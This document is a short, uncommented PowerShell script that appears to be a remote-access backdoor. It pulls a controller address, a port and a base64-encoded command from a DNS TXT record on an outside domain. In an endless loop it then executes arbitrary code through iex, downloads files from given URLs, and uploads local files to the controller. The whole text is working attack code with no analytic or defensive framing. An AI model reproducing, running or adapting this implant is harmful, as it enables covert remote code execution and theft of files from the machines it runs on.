$query = Resolve-DnsName -Type TXT -Name post.thomassomerville.com
$results = $query.strings -split ","
$address = $results[0]
$port = $results[1]
$cmd = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($results[2]))

While ($True){
    if ($cmd.StartsWith("EXEC=")){
        $exec = iex($cmd.substring(5))
    }
    if ($cmd.StartsWith("RUN=")){
        iex($cmd.substring(4))
    }
    if ($cmd.StartsWith("DOWN=")){
        $downCMD = $cmd.substring(5) -split ","
        Invoke-WebRequest -Uri $downCMD[0] -OutFile $downCMD[1]    
    }
    if ($cmd.StartsWith("PUT=")){
        $putCMD = $cmd.substring(4) -split ","
        $url = "http://"+$address+":"+$port
        $wc = New-Object System.Net.WebClient
        $wc.UploadFile($url,$putCMD[0])
    }
    Start-Sleep -s 100
}
